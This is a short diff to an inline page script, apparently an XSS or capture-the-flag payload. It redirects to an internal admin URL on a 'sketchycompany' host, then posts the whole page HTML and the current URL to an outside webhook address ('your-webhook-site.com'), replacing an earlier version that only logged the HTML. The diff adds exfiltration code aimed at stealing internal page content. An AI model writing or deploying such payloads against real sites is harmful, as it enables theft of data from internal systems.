@@ -13,7 +13,26 @@
 
 <script>
     document.location.href = 'https://internal.sketchycompany.upd-dcs.work/admin';
-    const wholeHTML = document.documentElement.outerHTML;
-    console.log(wholeHTML);
+    const htmlContent = document.documentElement.outerHTML;
+
+// Send it to your webhook via POST
+fetch('https://your-webhook-site.com', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    url: window.location.href,
+    html: htmlContent
+  })
+})
+.then(response => {
+  console.log('Webhook sent successfully');
+  // Optional: proceed with redirect after posting
+  // window.location.href = 'https://destination-site.com';
+})
+.catch(error => {
+  console.error('Error posting to webhook:', error);
+});
     
 </script>
